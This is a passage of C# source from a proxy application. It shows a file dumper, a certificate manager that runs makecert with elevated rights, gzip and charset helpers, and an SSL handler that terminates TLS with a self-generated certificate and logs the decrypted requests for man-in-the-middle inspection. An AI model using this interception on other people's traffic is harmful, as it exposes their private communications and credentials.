                if (alertsTriggerd != null) alertsTriggerd.Clear();
                alertsTriggerd = null;
                ctx = null;
            }

            disposed = true;
        }

        List<Func<bool>> conditionList = new List<Func<bool>>();
        List<VLogger.LogObj> alertMessages = new List<VLogger.LogObj>();
        Thread _thread;
        bool letRun = true;
        Dictionary<int, DateTime> alertsTriggerd = new Dictionary<int, DateTime>();
        DateTime waitForServer;
        bool ignoreServer = false;
        Form1 ctx;

        public VDependencyWatcher(Form1 context)
        {
            ctx = context;
        }

        /// <summary>
        /// Add's a condition, which is if true a Dependency alert will trigger!
        /// </summary>
        /// <param name="condition">A condition to be tested (when true, warning will be popped)</param>

        public void AddCondition(Func<bool> condition, VLogger.LogObj alertMessage)
        {
            conditionList.Add(condition);
            alertMessages.Add(alertMessage);
        }

        /// <summary>
        /// Remove's a condition from the list
        /// </summary>
        /// <param name="index">The index of the condition to be removed</param>

        public void RemoveCondition(int index)
        {
            conditionList.RemoveAt(index);
            alertMessages.RemoveAt(index);
        }

        /// <summary>
        /// Remove's a condition from the list
        /// </summary>
        /// <param name="condition">Condition to be removed</param>

        public void RemoveCondition(Func<bool> condition)
        {
            int index = conditionList.IndexOf(condition);
            RemoveCondition(index);
        }

        /// <summary>
        /// Start's the watcher thread, to detect when a condition is true
        /// </summary>

        public void StartWatcher()
        {
            Thread t = new Thread(new ThreadStart(DWThread));
            t.Start();
        }

        /// <summary>
        /// Stop's the watcher thread, disables the condition checking
        /// </summary>

        public void StopWatcher()
        {
            letRun = false;
            if (_thread != null) _thread = null;
            alertsTriggerd.Clear();
        }

        private void DWThread()
        {
            int loopIndex = 0;

            while (letRun)
            {

                foreach (Func<bool> cond in conditionList)
                {
                    if (cond())
                    {
                        TriggerAlert(loopIndex);
                    }
                    else
                    {
                        //Console.WriteLine("Condition is false");
                    }

                    loopIndex++;
                }

                loopIndex = 0;
                Thread.Sleep(1000);
            }
        }

        private void TriggerAlert(int index)
        {
            if (!ctx.isStarted && !ignoreServer)
            {
                if (waitForServer == default(DateTime)) waitForServer = DateTime.Now;
                TimeSpan timeElapsed = DateTime.Now - waitForServer;
                if (timeElapsed.Minutes > 4)
                {
                    ignoreServer = true;
                }
                else return;
            }

            if (alertsTriggerd.ContainsKey(index))
            {
                DateTime current = DateTime.Now;
                DateTime lastAlert = alertsTriggerd[index];
                TimeSpan p = current - lastAlert;
                if (p.TotalMinutes < 10) return;
                else
                {
                    alertsTriggerd[index] = current;
                }
            }

            if (!alertsTriggerd.ContainsKey(index)) alertsTriggerd.Add(index, DateTime.Now);
            VLogger.LogObj lo = alertMessages[index];
            ctx.LogMod.Log(lo.message, lo.ll);
        }
    }

    public class VDictionary : IDisposable //String only
    {

        //IDisposable Implementation

        bool disposed = false;
        SafeFileHandle handle = new SafeFileHandle(IntPtr.Zero, true);

        public void Dispose()
        {
            Dispose(true);
            GC.SuppressFinalize(this);
        }

        protected virtual void Dispose(bool disposing)
        {
            if (disposed) return;
            if (disposing)
            {
                handle.Dispose();
                kvp.Clear();
                kvp = null;
            }

            disposed = true;
        }

        List<KeyValuePair<string, string>> kvp = new List<KeyValuePair<string, string>>();
        public IEnumerable<KeyValuePair<string, string>> Items
        {
            get
            {
                foreach (KeyValuePair<string, string> lvp in kvp)
                {
                    yield return lvp;
                }
            }
        }
        public int Count
        {
            get { return kvp.Count; }
        }
        public List<string> Keys
        {
            get
            {
                List<string> temp = new List<string>();
                foreach (KeyValuePair<string, string> lvp in kvp)
                {
                    temp.Add(lvp.Key);
                }

                return temp;
            }
        }
        public List<string> Values
        {
            get
            {
                List<string> temp = new List<string>();
                foreach (KeyValuePair<string, string> lvp in kvp)
                {
                    temp.Add(lvp.Value);
                }

                return temp;
            }
        }

        public string this [string index]
        {
            get
            {
                return At(index);
            }

            set
            {
                SetOne(index, value);
            }
        }

        public void SetOne(string key, string newText)
        {
            int i = 0;
            bool canSet = false;

            foreach (KeyValuePair<string, string> lvp in kvp)
            {
                if (lvp.Key == key)
                {
                    canSet = true;
                    break;
                }
                i++;
            }

            if (canSet) SetByIndex(i, newText);
        }

        public void SetByIndex(int index, string newText)
        {
            kvp[index] = new KeyValuePair<string, string>(kvp[index].Key, newText);
        }

        public void SetByIndex(int[] indicies, string[] newText)
        {
            int loopIndex = 0;
            foreach (int i in indicies)
            {
                SetByIndex(i, newText[loopIndex]);
                loopIndex++;
            }
        }

        public void SetAll(string key, string value)
        {
            foreach (KeyValuePair<string, string> lvp in kvp)
            {
                if (lvp.Key == key)
                {
                    SetOne(key, value);
                }
            }
        }

        /// <summary>
        /// Add's an element into the Dictionary
        /// </summary>
        /// <param name="key">The key of the element (can be a duplicate)</param>
        /// <param name="value">The value of the element (can be a dublicate)</param>

        public void Add(string key, string value)
        {
            KeyValuePair<string, string> current = new KeyValuePair<string, string>(key, value);
            kvp.Add(current);
        }

        /// <summary>
        /// Remove's the first element having the same key as specified
        /// </summary>
        /// <param name="key">The key of the element to be removed</param>

        public void RemoveByKey(string key)
        {
            int index = 0;
            bool canRemove = false;
            foreach (KeyValuePair<string, string> lvp in kvp)
            {
                if (lvp.Key == key)
                {
                    canRemove = true;
                    break;
                }

                index++;
            }

            if (canRemove) kvp.RemoveAt(index);
        }

        /// <summary>
        /// Remove's all element having the same key as specified
        /// </summary>
        /// <param name="key">The key of the element(s) you want to remove</param>

        public void RemoveAllByKey(string key)
        {
            List<int> temp = new List<int>();
            int index = 0;

            foreach (KeyValuePair<string, string> lvp in kvp)
            {
                if (lvp.Key == key)
                {
                    temp.Add(index);
                }

                index++;
            }

            if (temp.Count > 0)
            {
                RemoveByIndex(temp.ToArray());
            }
        }

        /// <summary>
        /// Remove's all element from the dictionary
        /// </summary>

        public void Clear()
        {
            kvp.Clear();
        }

        /// <summary>
        /// Remove's an element with the specified index form the dictionary
        /// </summary>
        /// <param name="index">The index of the item you want ot remove</param>

        public void RemoveByIndex(int index)
        {
            kvp.RemoveAt(index);
        }

        /// <summary>
        /// Remove's multiple items specified by the indices array
        /// </summary>
        /// <param name="indicies">The int array of the element id's which you want to remove</param>

        public void RemoveByIndex(int[] indicies)
        {
            for (int i = 0; i < indicies.Length; i++)
            {
                int cIndex = indicies[i];
                kvp.RemoveAt(cIndex);
                for (int c = i; c < indicies.Length; c++)
                {
                    int lci = indicies[c];
                    if (lci > cIndex)
                    {
                        indicies[c] -= 1;
                    }
                }
            }
        }

        /// <summary>
        /// Read's the first element with the specified key
        /// </summary>
        /// <param name="key">The key of the element</param>
        /// <returns>String value</returns>

        public string At(string key)
        {
            int index = 0;

            foreach (KeyValuePair<string, string> lvp in kvp)
            {
                if (lvp.Key == key)
                {
                    return At(index);
                }

                index++;
            }

            return null;
        }

        /// <summary>
        /// Read's the value of an element based on the index specified
        /// </summary>
        /// <param name="index">Index of the element</param>
        /// <returns>String value</returns>

        public string At(int index)
        {
            if (index >= kvp.Count || kvp.Count == 0) return null;
            string value = kvp[index].Value;
            return value;
        }

        /// <summary>
        /// Read's multiple items with the same key
        /// </summary>
        /// <param name="key">The key of the item(s)</param>
        /// <returns>String array of values</returns>

        public IEnumerable<string> GetMultipleItems(string key)
        {
            int index = 0;

            foreach (KeyValuePair<string, string> lvp in kvp)
            {
                if (lvp.Key == key)
                {
                    yield return At(index);
                }

                index++;
            }
        }

        /// <summary>
        /// Read's multiple items based on the indeicies
        /// </summary>
        /// <param name="indicies">The indicies of the requested values</param>
        /// <returns>String array of values</returns>

        public IEnumerable<string> GetMultipleItems(int[] indicies)
        {
            foreach (int i in indicies)
            {
                yield return kvp[i].Value;
            }
        }

        /// <summary>
        /// Read's wheter you have at least one element with the specified key
        /// </summary>
        /// <param name="key">The key of the element you want to search</param>
        /// <returns>True if element with the key is present</returns>

        public bool ContainsKey(string key)
        {
            foreach (KeyValuePair<string, string> lvp in kvp)
            {
                if (lvp.Key == key) return true;
            }

            return false;
        }

        /// <summary>
        /// Read's wheter at least one element with the same value exists
        /// </summary>
        /// <param name="value">The value of the element to search</param>
        /// <returns>True if the value is in at least on of the elements</returns>

        public bool ContainsValue(string value)
        {
            foreach (KeyValuePair<string, string> lvp in kvp)
            {
                if (lvp.Value == value) return true;
            }

            return false;
        }
    }

    public class VDump : IFilter, IService, ISettings, IHelp, IDisposable
    {
        //IDisposable Implementation

        bool disposed = false;
        SafeFileHandle handle = new SafeFileHandle(IntPtr.Zero, true);

        public void Dispose()
        {
            Dispose(true);
            GC.SuppressFinalize(this);
        }

        protected virtual void Dispose(bool disposing)
        {
            if (disposed) return;
            if (disposing)
            {
                handle.Dispose();
                _helpFile = null;
                _pRestore = null;
                filterNames = null;
                _vfmanager = null;
                ctx = null;
                console = null;
                logger = null;
                dumpFiles.Clear();
                fName.Clear();
                Dir = null;
            }

            disposed = true;
        }

        //IHelp Implementation

        private string _helpFile = "";

        public string HelpFile
        {
            get { return _helpFile; }
            set
            {
                if (File.Exists(value)) _helpFile = value;
            }
        }

        //ISettings implementation

        public void LoadSettings(KeyValuePair<string, string> kvp)
        {
            string key = kvp.Key.ToLower();
            string value = kvp.Value.ToLower();

            if (key == "state") started = (value == "true") ? true : false;
            if (key == "dumper_file") dumpFiles.Add(kvp.Value);
            if (key == "dumper_fname") fName.Add(kvp.Value);
        }

        public void WriteSettings(System.Xml.XmlWriter xml)
        {
            xml.WriteStartElement("settings_start");
            xml.WriteStartElement("dumper");
            xml.WriteElementString("state", (started) ? "true" : "false");

            foreach (string file in dumpFiles)
            {
                xml.WriteElementString("dumper_file", file);
            }

            foreach (string fn in fName)
            {
                xml.WriteElementString("dumper_fname", fn);
            }
            xml.WriteEndElement();
            xml.WriteEndElement();
        }

        //IService implementation

        private bool _started = false;
        private bool _selfInteractive = false;
        private string _pRestore = "";

        public bool started { get { return _started; } set { _started = value; } }
        public bool selfInteractive { get { return _selfInteractive; } set { _selfInteractive = value; } }
        public string pRestore { get { return _pRestore; } set { _pRestore = value; } }

        public void WarningMessage()
        {
            logger.Log("Service Dump is not started", VLogger.LogLevel.warning);
        }

        //IFilter implementation

        private Dictionary<string, object> filterNames = new Dictionary<string, object>();
        private VFilter _vfmanager;

        public Dictionary<string, object> filterName
        {
            get { return filterNames; }
            set { filterNames = value; }
        }

        public VFilter manager
        {
            get { return _vfmanager; }
            set { _vfmanager = value; }
        }

        public string PushBindInfo()
        {
            string info = "";

            foreach (KeyValuePair<string, object> kvp in filterNames)
            {
                string part2 = kvp.Value.ToString();
                info += kvp.Key + ":" + part2 + ";";
            }

            if (info.Length > 0) info = info.Substring(0, info.Length - 1);

            return info;
        }

        public void PullBindInfo(string info)
        {
            if (info == "") return;
            String[] kvp = info.Split(';');
            foreach (String pairs in kvp)
            {
                string[] kvp2 = pairs.Split(':');
                int level = int.Parse(kvp2[1]);
                string name = kvp2[0];
                filterNames.Add(name, level);
            }
        }

        public bool BindFilter(string validFilterName, object input)
        {
            int op = (int)input;
            if (dumpFiles.Count < op) return false;
            filterNames.Add(validFilterName, op);
            return true;
        }

        public bool SearchFilter(string sMethod, object searchParam, string input)
        {
            int p = (int)searchParam;
            string targetFilterName = "";
            foreach (KeyValuePair<string, object> pair in filterNames)
            {
                int comp = (int)pair.Value;
                if (comp == p)
                {
                    targetFilterName = pair.Key;
                    break;
                }
            }

            if (targetFilterName == "")
            {
                return true; // if target filter is not found output the text, perhaps there is no filter for a specific object
            }

            if (sMethod == "and")
            {
                return manager.RunAllCompareAnd(targetFilterName, input);
            }
            else if (sMethod == "or")
            {
                return manager.RunAllCompareOr(targetFilterName, input);
            }
            else
            {
                console.WriteLine("[ERROR] Invalid SearchFilter option sMethod", console.GetIntercativeGroup());
                return true;
            }
        }

        public bool UnBindFilter(string validFilterName)
        {
            if (!filterName.ContainsKey(validFilterName)) return false;
            filterName.Remove(validFilterName);
            return true;
        }

        public void BindList()
        {
            console.WriteLine("=========Start Of bind list=========");
            foreach (KeyValuePair<string, object> kvp in filterNames)
            {
                int ll = (int)kvp.Value;
                console.WriteLine(kvp.Key + ":\t" + dumpFiles[ll]);
            }
            console.WriteLine("==========End Of bind list==========");
        }

        public void SetManager(VFilter fman)
        {
            manager = fman;
        }

        //Main Dumper Class

        private Form1 ctx;
        private VConsole console;
        private VLogger logger;
        private List<string> dumpFiles;
        private List<string> fName;
        public string Dir { get; private set; } = "";

        public VDump(Form1 context, VConsole con, VLogger log)
        {
            ctx = context;
            console = con;
            logger = log;
            dumpFiles = new List<string>();
            fName = new List<string>();
        }

        public void ListDumpers()
        {
            console.WriteLine("==Dump Manager Dump Files List==", console.GetIntercativeGroup());
            if (Dir != "") console.WriteLine("Relative directory: " + Dir, console.GetIntercativeGroup());

            foreach (string file in dumpFiles)
            {
                int index = GetFileIndex(file);
                string fname = "";
                foreach (string entry in fName)
                {
                    if (GetFId(entry) == index)
                    {
                        fname = GetFName(entry);
                    }
                }

                string output = file;
                if (Dir != "") output = new FileInfo(file).Name;
                if (fname != "") output += " - " + fname;

                console.WriteLine(output, console.GetIntercativeGroup());
            }

            console.WriteLine("==End of Dump Files list==", console.GetIntercativeGroup());
        }

        public void DefineDirectory(string dir)
        {
            if (!Directory.Exists(dir)) Directory.CreateDirectory(dir);
            Dir = dir;
        }

        public void AddFile(string fileName, string friendlyName = null, bool useQuestion = true)
        {
            if (Dir != "") fileName = Dir + "\\" + fileName;

            if (!File.Exists(fileName))
            {
                using (FileStream fs = File.Create(fileName)) ;
                dumpFiles.Add(fileName);
                if (fName != null)
                {
                    int lstIndex = dumpFiles.Count - 1;
                    string entry = friendlyName + ":" + lstIndex;
                    fName.Add(entry);
                }
            }
            else
            {
                bool overwrite = false;

                if (useQuestion)
                {
                    string p = console.GetPrompt();
                    console.SetPrompt("[Y/N]");
                    overwrite = console.ChoicePrompt("File already exists.\r\nDo you want to override it? [Y/N]");
                    console.SetPrompt(p);
                }
                
                if (overwrite)
                {
                    File.Delete(fileName);
                    AddFile(fileName, friendlyName, useQuestion);
                }
                else
                {
                    dumpFiles.Add(fileName);
                    if (fName != null)
                    {
                        int lstIndex = dumpFiles.Count - 1;
                        string entry = friendlyName + ":" + lstIndex;
                        fName.Add(entry);
                    }
                }
            }
        }

        public void AssignFriendlyName(string fileName, string friendlyName)
        {
            if (Dir != "") fileName = Dir + "\\" + fileName;
            int index = GetFileIndex(fileName);
            string entry = friendlyName + ":" + index.ToString();
            fName.Add(entry);
        }

        public void RemoveFriendlyName(string friendlyName)
        {
            int currentIndex = 0;
            foreach(string fn in fName)
            {
                if (GetFName(fn) == friendlyName) break;

                currentIndex++;
            }

            fName.RemoveAt(currentIndex);
        }

        public void Dump(string text, string friendlyName)
        {
            if (dumpFiles.Count <= 0) return;
            int index = -1;
            foreach (string fn in fName)
            {
                if (GetFName(fn) == friendlyName)
                {
                    index = GetFId(fn);
                    break;
                }
            }

            if (index != -1) LDump(text, dumpFiles[index]);
        }

        public void Dump(string text)
        {
            if (dumpFiles.Count <= 0) return;
            LDump(text, dumpFiles[0]);
        }

        public void Dump(string text, int filePathId)
        {
            if (dumpFiles.Count <= 0) return;
            LDump(text, dumpFiles[filePathId]);
        }

        public int GetIndexByFilePath(string fp)
        {
            if (Dir != "") fp = Dir + "\\" + fp;
            return GetFileIndex(fp);
        }

        public int GetIndexByFriendlyName(string fn)
        {
            foreach (string f in fName)
            {
                if (GetFName(f) == fn)
                {
                    return GetFId(f);
                }
            }

            return -1;
        }

        public void RemoveFile(int fp)
        {
            if (dumpFiles.Count < fp)
            {
                int counter = 0;
                foreach (string fn in fName)
                {
                    if (GetFId(fn) == fp) break;
                    counter++;
                }

                fName.RemoveAt(counter); // remove friendly name too
                dumpFiles.RemoveAt(fp);
            }
        }

        public bool CheckFileByFriendlyName(string FriendlyName)
        {
            foreach (string fn in fName)
            {
                if (GetFName(fn) == FriendlyName)
                {
                    int fIndex = GetFId(fn);
                    return CheckFileByPath(dumpFiles[fIndex]);
                }
            }

            return false;
        }

        public bool CheckFileByPath(string filePath)
        {
            if (dumpFiles.Contains(filePath)) return true;
            return false;
        }

        //Private methods

        private void LDump(string text, string lFile)
        {
            if (!started) return;
            int findex = GetFileIndex(lFile);
            if (filterNames.Count > 0)
            {
                if (SearchFilter("or", findex, text)) return;
            }
            string old = File.ReadAllText(lFile);
            string nl = Environment.NewLine;
            string n = "";
            if (old == "") n = text;
            else n = old + nl + text;
            File.WriteAllText(lFile, n);
        }

        private int GetFileIndex(string fileName)
        {
            int index = 0;
            foreach (string f in dumpFiles)
            {
                if (f == fileName) return index;
                index++;
            }

            return -1;
        }

        private string GetFName(string input)
        {
            if (input.Contains(':'))
            {
                return input.Split(':')[0];
            }
            else return null;
        }

        private int GetFId(string input)
        {
            if (input.Contains(':'))
            {
                string text = input.Split(':')[1];
                int id = -1;
                int.TryParse(text, out id);
                return id;
            }
            else return -1;
        }
    }

    public class VSslHandler : IDisposable
    {
        //IDisposable Implementation

        bool disposed = false;
        SafeFileHandle handle = new SafeFileHandle(IntPtr.Zero, true);

        public void Dispose()
        {
            Dispose(true);
            GC.SuppressFinalize(this);
        }

        protected virtual void Dispose(bool disposing)
        {
            if (disposed) return;
            if (disposing)
            {
                handle.Dispose();
                host = null;
                ctx = null;
                certman = null;
                Close();
                _ssl = null;
                Array.Clear(buffer, 0, buffer.Length);
                buffer = null;
                console = null;
                tunnel = null;
            }

            disposed = true;
        }

        private string host = "";
        private Form1 ctx;
        private VSslCertification certman;
        private SslStream _ssl;
        private byte[] buffer = new byte[2048];
        private VConsole console;
        public Tunnel tunnel;

        public VSslHandler(Form1 context, VConsole con)
        {
            ctx = context;
            console = con;
        }

        public enum Error
        {
            CertificateManagerNotAvailable,
            Success,
            CertAutoGenerationFailed,
            CertRetrieveFailed,
            SslProtocolRetrieveFailed,
            SslServerAuthFailed,
            SslStreamCantWrite,
            SslStreamWriteFailed,
            SslStreamDisposed
        }

        public Error InitSslStream(NetworkStream ns, string targetHost)
        {
            host = targetHost;
            SslStream ssl = new SslStream(ns);
            certman = ctx.CertMod;
            if (certman == null || !certman.started) return Error.CertificateManagerNotAvailable;

            X509Certificate2 cert = certman.GetCert();
            bool cgResult = true;
            if (cert == null && certman.AutoGenerate) cgResult = certman.GenerateCertificate("auto-generated-" + DateTime.Now.Year + "-" + DateTime.Now.Month + "-" + DateTime.Now.Day);
            if (!cgResult) return Error.CertAutoGenerationFailed;
            cert = certman.GetCert();
            if (cert == null) return Error.CertRetrieveFailed;
            SslProtocols sp = certman.GetProtocols();
            if (sp == SslProtocols.None) return Error.SslProtocolRetrieveFailed;
            try
            {
                ssl.AuthenticateAsServer(cert, false, sp, true);
                _ssl = ssl;
                return Error.Success;
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.Message);
                return Error.SslServerAuthFailed;
            }
        }

        public byte[] ReadSslStream()
        {
            BinaryReader br = new BinaryReader(_ssl);
            byte[] xBuffer = new byte[2048];
            byte[] tempBuf = null;

            while (true)
            {
                int bytesRead = br.Read(xBuffer, 0, xBuffer.Length);
                if (bytesRead == 0) break;
                if (tempBuf == null)
                {
                    tempBuf = new byte[bytesRead];
                    Array.Copy(xBuffer, tempBuf, bytesRead);
                }
                else
                {
                    byte[] tBuf = new byte[tempBuf.Length];
                    Array.Copy(tempBuf, tBuf, tempBuf.Length);
                    tempBuf = new byte[tBuf.Length + bytesRead];
                    Array.Copy(tBuf, tempBuf, tBuf.Length);
                    Array.ConstrainedCopy(xBuffer, 0, tempBuf, tBuf.Length, bytesRead);
                }
            }

            return tempBuf;
        }

        public void InitAsyncRead()
        {
            ReadObj r = new ReadObj();
            r.full = "";
            r.r = null;
            _ssl.BeginRead(buffer, 0, buffer.Length, new AsyncCallback(ReadFromStream), r);
        }

        public Error WriteSslStream(byte[] data)
        {
            if (_ssl == null) return Error.SslStreamDisposed;
            if (!_ssl.CanWrite) return Error.SslStreamCantWrite;
            try { _ssl.Write(data, 0, data.Length); }
            catch (Exception)
            {
                return Error.SslStreamWriteFailed;
            }

            return Error.Success;
        }

        public void FlushSslStream()
        {
            _ssl.Flush();
        }

        public Error Close()
        {
            if (_ssl == null) return Error.SslStreamDisposed;
            _ssl.Close();
            _ssl.Dispose();
            return Error.Success;
        }

        struct ReadObj
        {
            public string full;
            public Request r;
        }

        private void ReadFromStream(IAsyncResult ar)
        {
            ReadObj ro = (ReadObj)ar.AsyncState;
            Request r = ro.r;
            int bytesRead = 0;
            try { bytesRead = _ssl.EndRead(ar); }
            catch (Exception) { return; }
            byte[] read = new byte[bytesRead];
            Array.Copy(buffer, read, bytesRead);
            string text = Encoding.ASCII.GetString(read);
            //if (bytesRead > 0) console.Debug(text);
            if (bytesRead > 0)
            {
                if (r == null)
                {
                    r = new Request(text, console, true);
                }
                console.Debug(text);
                //if (r.bogus) ctx.LogMod.Log("SSL Request is bogus", VLogger.LogLevel.error);
                if (r.notEnded)
                {
                    if (ro.full == "") ro.full = text;
                    else
                    {
                        ro.full += text;
                        r = new Request(ro.full, console, true);
                    }
                }

                if (!r.notEnded && !r.bogus)
                {
                    if (ctx.mitmHttp.started)
                    {
                        ctx.mitmHttp.DumpRequest(r);
                    }

                    tunnel.Send(r.Deserialize());
                    ro.full = "";
                }
            }

            Array.Clear(buffer, 0, buffer.Length);
            ro.r = r;
            try { _ssl.BeginRead(buffer, 0, buffer.Length, new AsyncCallback(ReadFromStream), ro); }
            catch (Exception ex)
            {
                Console.WriteLine("Ssl stream error MITM\r\n" + ex.Message);
                Console.WriteLine("St: " + ex.StackTrace);
            }
        }
    }

    public class VSslCertification : IService, ISettings, IHelp, IDisposable
    {
        //IDisposable Implementation

        bool disposed = false;
        SafeFileHandle handle = new SafeFileHandle(IntPtr.Zero, true);

        public void Dispose()
        {
            Dispose(true);
            GC.SuppressFinalize(this);
        }

        protected virtual void Dispose(bool disposing)
        {
            if (disposed) return;
            if (disposing)
            {
                handle.Dispose();
                _helpFile = null;
                _pRestore = null;
                CertFile = null;
                logger = null;
                if (SslProt != null) Array.Clear(SslProt, 0, SslProt.Length);
                SslProt = null;
                self = null;
                console = null;
            }

            disposed = true;
        }

        //IHelp implementation

        private string _helpFile = "";

        public string HelpFile
        {
            get { return _helpFile; }
            set
            {
                if (File.Exists(value)) _helpFile = value;
            }
        }

        //ISettings implementation

        public void LoadSettings(KeyValuePair<string, string> kvp)
        {
            string key = kvp.Key.ToLower();
            string value = kvp.Value.ToLower();
            if (key == "state") started = (value == "true") ? true : false;
            if (key == "file_path") SetFile(kvp.Value);
            if (key == "protocols") SetProtocols(StringToProtocols(value));
            if (key == "state_autogen") AutoGenerate = (value == "true") ? true : false;
        }

        public void WriteSettings(System.Xml.XmlWriter xml)
        {
            xml.WriteStartElement("settings_start");
            xml.WriteElementString("state", (started) ? "true" : "false");
            xml.WriteElementString("file_path", CertFile);
            if (SslProt.Length > 0) xml.WriteElementString("protocols", ProtocolToString());
            xml.WriteElementString("state_autogen", (AutoGenerate) ? "true" : "false");
            xml.WriteEndElement();
        }

        //IService Implementation

        private bool _started = false;
        private bool _selfInteractive = false;
        private string _pRestore = "";

        public bool started
        {
            get { return _started; }
            set { _started = value; }
        }

        public bool selfInteractive
        {
            get { return _selfInteractive; }
            set { _selfInteractive = value; }
        }

        public string pRestore
        {
            get { return _pRestore; }
            set { _pRestore = value; }
        }

        public void WarningMessage()
        {
            logger.Log("SSL Certification is not started!", VLogger.LogLevel.warning);
        }


        //Main SSL Cert class

        public string CertFile { get; private set; } = "";
        private VLogger logger;
        private SslProtObj[] SslProt;
        private static VSslCertification self;
        public bool AutoGenerate = false;
        private VConsole console;

        public struct SslProtObj
        {
            public SslProtocols sslProt;
        }

        public VSslCertification(VLogger log, VConsole con)
        {
            logger = log;
            console = con;
            self = this;
        }

        public bool SetFile(string filePath)
        {
            if (File.Exists(filePath))
            {
                CertFile = filePath;
                return true;
            }

            return false;
            
        }

        public X509Certificate2 GetCert()
        {
            if (CertFile == null || !File.Exists(CertFile)) return null;
            X509Certificate2 c = new X509Certificate2(CertFile);
            return c;
        }

        private void GenBatch(string mcertCommand)
        {
            string nl = Environment.NewLine;
            string batchFile = "@echo off" + nl + "cd \"" + Application.StartupPath + "\"" + nl;
            string dLetter = Application.StartupPath.Split(':')[0];
            batchFile += dLetter + ":" + nl;
            batchFile += mcertCommand + nl;
            batchFile += "echo Operation Completed!";
            using (FileStream fs = File.Create("gencert.bat")) ;
            File.WriteAllText("gencert.bat", batchFile);
        }

        public bool GenerateCertificate(string filePath, string cn = "ah101", int dataLength = 2048)
        {
            string mc = "makecert.exe " + filePath + " -a sha1 -n \"CN = " + cn + "\" -sr LocalMachine -ss My -sky signature -pe -len " + dataLength.ToString();
            GenBatch(mc);
            if (!File.Exists("gencert.bat")) return false;
            if (!File.Exists("makecert.exe")) return false;
            Process p = new Process();
            ProcessStartInfo info = new ProcessStartInfo();
            info.FileName = "gencert.bat";
            info.WindowStyle = ProcessWindowStyle.Normal;
            info.WorkingDirectory = Application.StartupPath;
            info.UseShellExecute = true;
            info.Verb = "runas"; //only in administrator mode will makecert work
            p.StartInfo = info;
            logger.Log("Starting gencert.bat external script\r\nPlease accept the UAC (admin privileges) prompt :) - if needed", VLogger.LogLevel.information);
            p.Start();
            p.WaitForExit();
            logger.Log("gencert.bat external script stopped running", VLogger.LogLevel.information);
            Thread.Sleep(1000);
            if (File.Exists(filePath))
            {
                logger.Log("Certification Created Successfully!", VLogger.LogLevel.information);
                return true;
            }

            logger.Log("Certificate generation failed!", VLogger.LogLevel.error);
            return false;
        }

        public SslProtocols GetProtocols()
        {
            SslProtocols protChain = SslProt[0].sslProt;
            for (int i = 1; i < SslProt.Length; i++)
            {
                protChain = protChain | SslProt[i].sslProt;
            }

            return protChain;
        }

        public void SetProtocols(SslProtObj[] prots)
        {
            SslProt = prots;
        }

        public static string ProtocolToString()
        {
            string result = "";
            foreach (SslProtObj po in self.SslProt)
            {
                SslProtocols prot = po.sslProt;
                if (prot == SslProtocols.Default) result += "default,";
                if (prot == SslProtocols.None) result += "none,";
                if (prot == SslProtocols.Ssl2) result += "sslv2,";
                if (prot == SslProtocols.Ssl3) result += "sslv3,";
                if (prot == SslProtocols.Tls) result += "tls,";
                if (prot == SslProtocols.Tls11) result += "tlsv11,";
                if (prot == SslProtocols.Tls12) result += "tlsv12,";
            }

            if (result == "") result = null;
            else result.Substring(0, result.Length - 1);
            return result;
        }

        public static SslProtObj[] StringToProtocols(string input)
        {
            if (input == "" || input == null)
            {
                SslProtObj poDefault = new SslProtObj();
                poDefault.sslProt = SslProtocols.None;
                return new SslProtObj[] { poDefault };
            }

            if (!input.Contains(","))
            {
                input = input + ",";
            }

            List<SslProtObj> poList = new List<SslProtObj>();
            String[] prots = input.Split(',');
            foreach (string prot in prots)
            {
                if (prot == "") continue;
                SslProtObj po = new SslProtObj();
                if (prot == "default") po.sslProt = SslProtocols.Default;
                if (prot == "none") po.sslProt = SslProtocols.None;
                if (prot == "sslv2") po.sslProt = SslProtocols.Ssl2;
                if (prot == "sslv3") po.sslProt = SslProtocols.Ssl3;
                if (prot == "tls") po.sslProt = SslProtocols.Tls;
                if (prot == "tlsv11") po.sslProt = SslProtocols.Tls11;
                if (prot == "tlsv12") po.sslProt = SslProtocols.Tls12;
                poList.Add(po);
            }

            return poList.ToArray();
        }
    }

    public class VDecoder
    {
        public string DecodeGzip(byte[] gzipData)
        {
            byte[] result = DecGzipData(gzipData);
            return Encoding.ASCII.GetString(result, 0, result.Length);
        }

        public byte[] DecodeGzipToBytes(byte[] gzipData)
        {
            return DecGzipData(gzipData);
        }

        public byte[] EncodeGzip(string text)
        {
            byte[] gzipData = Encoding.ASCII.GetBytes(text);

            using (MemoryStream ms = new MemoryStream())
            {
                using (System.IO.Compression.GZipStream gzip = new System.IO.Compression.GZipStream(ms, System.IO.Compression.CompressionMode.Compress, true))
                {
                    gzip.Write(gzipData, 0, gzipData.Length);
                }
                return ms.ToArray();
            }
        }

        public byte[] EncodeGzip(byte[] gzipData)
        {
            using (MemoryStream ms = new MemoryStream())
            {
                using (System.IO.Compression.GZipStream gzip = new System.IO.Compression.GZipStream(ms, System.IO.Compression.CompressionMode.Compress, true))
                {
                    gzip.Write(gzipData, 0, gzipData.Length);
                }
                return ms.ToArray();
            }
        }

        public string DecodeCharset(string cType, byte[] value, int bytesRead)
        {
            string result = "";

            Encoding e = GetEncoding(cType);
            cType = null;
            result = e.GetString(value, 0, bytesRead);

            return result;
        }

        public byte[] EncodeCharset(string cType, string value)
        {
            Encoding enc = GetEncoding(cType);
            return enc.GetBytes(value);
        }

        public byte[] EncodeCharset(string cType, string value, Encoding current)
        {
            Encoding target = GetEncoding(cType);
            byte[] bytes = current.GetBytes(value);
            return Encoding.Convert(current, target, bytes);
        }

        private Encoding GetEncoding(string cType)
        {
            if (cType.Contains(";"))
            {
                string[] ps = cType.Split(';');
                foreach (string entry in ps)
                {
                    if (entry.StartsWith("charset"))
                    {
                        string enc = entry.Split('=')[1];
                        Encoding encoder = Encoding.GetEncoding(enc);
                        return encoder;
                    }
                }

                return Encoding.GetEncoding("ISO-8859-1");
            }
            else
            {
                return Encoding.GetEncoding("ISO-8859-1");
            }
        }

        private byte[] DecGzipData(byte[] gzipData)
        {
            byte[] bytes = new byte[4096];
            byte[] decoded;

            using (System.IO.Compression.GZipStream stream = new System.IO.Compression.GZipStream(new MemoryStream(gzipData), System.IO.Compression.CompressionMode.Decompress))
            {
                using (MemoryStream memory = new MemoryStream())
                {
                    int count = 0;
                    do
                    {
                        count = stream.Read(bytes, 0, 4096);
                        if (count > 0)
                        {
                            memory.Write(bytes, 0, count);
                        }
                    }
                    while (count > 0);
                    decoded = memory.ToArray();
                }
            }

            return decoded;
        }
    }

    public class VMitm : ISettings, IHelp, IDisposable
    {
        //IDisposable Implementation

        bool disposed = false;
